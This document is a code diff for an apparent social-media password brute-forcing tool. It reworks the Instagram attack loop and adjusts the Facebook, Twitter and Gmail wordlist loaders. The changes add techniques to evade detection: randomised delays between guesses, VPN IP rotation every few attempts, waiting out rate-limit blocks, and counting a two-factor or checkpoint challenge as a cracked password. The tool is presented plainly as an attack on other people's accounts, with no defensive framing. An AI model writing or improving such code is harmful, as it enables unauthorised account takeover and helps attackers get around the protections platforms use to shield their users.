@@ -32,9 +32,27 @@ choiceCode = random.choice(codeList)
 
 
 def change_ip():
-  if "Arch" in distro.linux_distribution()[0]:
-    os.system("sudo systemctl start windscribe")
-  os.system("\nwindscribe connect " + choiceCode)
+  try:
+    # Check if running on Arch Linux
+    try:
+      if "Arch" in distro.linux_distribution()[0]:
+        os.system("sudo systemctl start windscribe")
+    except:
+      pass  # Ignore if distro detection fails
+
+    # Connect to random VPN server
+    print(f"\n{color.CYAN}[*] Connecting to VPN server: {choiceCode}...{color.END}")
+    result = os.system("windscribe connect " + choiceCode + " > /dev/null 2>&1")
+
+    if result == 0:
+      print(f"{color.GREEN}[+] VPN connected successfully{color.END}")
+      time.sleep(2)  # Wait for VPN to stabilize
+    else:
+      print(f"{color.YELLOW}[!] VPN connection may have failed, continuing...{color.END}")
+      time.sleep(1)
+  except Exception as e:
+    print(f"{color.YELLOW}[!] VPN error: {str(e)}, continuing without VPN...{color.END}")
+    time.sleep(1)
 
 def start():
 
@@ -141,43 +159,91 @@ def insta_bruteforce(username, wordlist, vpn):
   c_spam = 0
 
   try:
-      wl_file = open("wordlist/"+wordlist, 'r')
+      wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
       wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
       count = 0
   except FileNotFoundError:
       print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist into the 'wordlist' folder.\n\n"+color.END)
-      exit()  
+      exit()
 
   rs = requests.session()
-  for line in wl_lines:
+  total_passwords = len(wl_lines)
+  print(f"\n{color.CYAN}[*] Loaded {total_passwords} passwords from {wordlist}{color.END}")
+  print(f"{color.CYAN}[*] Starting bruteforce attack on @{username}...{color.END}\n")
+  time.sleep(2)
+
+  for idx, line in enumerate(wl_lines, 1):
       password = line
-      if insta_pass(username, line) == True:
+
+      try:
         os.system("clear")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
-        console.print(password, justify="center", style="#13f41e bold")
+        console.print(f"[{idx}/{total_passwords}] Testing: {password[:20]}{'...' if len(password) > 20 else ''}", justify="center", style="#CYAN")
+
+        result = insta_pass(username, password)
+
+        if result == True:
+          os.system("clear")
+          console.print(ascii_art, justify="center", style="#B0DAFF bold")
+          console.print(f"\n{color.GREEN}[+] PASSWORD FOUND: {password}{color.END}\n", justify="center", style="#13f41e bold")
+          console.print(f"Username: @{username}", justify="center", style="#13f41e")
+          console.print(f"Password: {password}", justify="center", style="#13f41e bold")
+          exit()
+        else:
+          os.system("clear")
+          console.print(ascii_art, justify="center", style="#B0DAFF bold")
+          console.print(f"[{idx}/{total_passwords}] Failed: {password[:30]}{'...' if len(password) > 30 else ''}", justify="center", style="#ea0408 bold")
+
+          # Add delay to avoid rate limiting
+          delay = random.randint(2, 5)
+          time.sleep(delay)
+
+          c_spam = c_spam + 1
+
+          # Change IP every 5-10 attempts if VPN is enabled
+          if vpn == 1 and c_spam % random.randint(5, 10) == 0:
+            change_ip()
+
+      except KeyboardInterrupt:
+        print(f"\n\n{color.YELLOW}[!] Attack interrupted by user{color.END}\n")
         exit()
-      elif insta_pass(username, line) == False:
-        os.system("clear")
-        console.print(ascii_art, justify="center", style="#B0DAFF bold")
-        console.print(line, justify="center", style="#ea0408 bold")
-        c_spam = c_spam + 1
-        if vpn == True:
-          change_ip()
+      except Exception as e:
+        print(f"\n{color.RED}[!] Error testing password: {str(e)}{color.END}")
+        time.sleep(3)
+        continue
+
+  print(f"\n\n{color.RED}[!] Password not found in wordlist{color.END}\n")
         
 def insta_pass(USER, PASSWORD):
   L = instaloader.Instaloader()
   try:
     L.login(USER, PASSWORD)
-    return 1
+    return True
   except Exception as e:
-    if "Checkpoint" in str(e):
-      return 1
-    elif "incorrect" in str(e):
-      return 0
-    elif "blocked" in str(e):
-      return 0
-    else:
-      return 0
+    error_msg = str(e).lower()
+
+    # Password found (checkpoint required)
+    if "checkpoint" in error_msg or "two-factor" in error_msg:
+      return True
+
+    # Wrong password
+    if "incorrect" in error_msg or "password" in error_msg:
+      return False
+
+    # Rate limited or blocked
+    if "blocked" in error_msg or "rate limit" in error_msg or "too many" in error_msg:
+      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 60 seconds...{color.END}")
+      time.sleep(60)
+      return False
+
+    # Other errors
+    if "user does not exist" in error_msg:
+      print(f"\n{color.RED}[!] User @{USER} does not exist!{color.END}\n")
+      exit()
+
+    # Unknown error - show it
+    print(f"\n{color.YELLOW}[!] Unknown error: {str(e)[:100]}{color.END}")
+    return False
     
 
 
@@ -370,7 +436,7 @@ def is_this_a_facebook_password(email, index, password):
 
 def facebook_bruteforce(username, wordlist, vpn):
   try:
-    wl_file = open("wordlist/"+wordlist, 'r')
+    wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
     wl_lines = wl_file.readlines()
     count = 0
   except FileNotFoundError:
@@ -385,7 +451,7 @@ def facebook_bruteforce(username, wordlist, vpn):
 
 def twitter_bruteforce(username, wordlist, vpn):
   try:
-      wl_file = open("wordlist/"+wordlist, 'r')
+      wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
       wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
       count = 0
   except FileNotFoundError:
@@ -422,7 +488,7 @@ def twitter_bruteforce(username, wordlist, vpn):
 
 def gmail_bruteforce(username, wordlist, vpn):
   try:
-    wl_file = open("wordlist/"+wordlist, 'r')
+    wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
     wl_lines = wl_file.readlines()
     count = 0
   except FileNotFoundError:
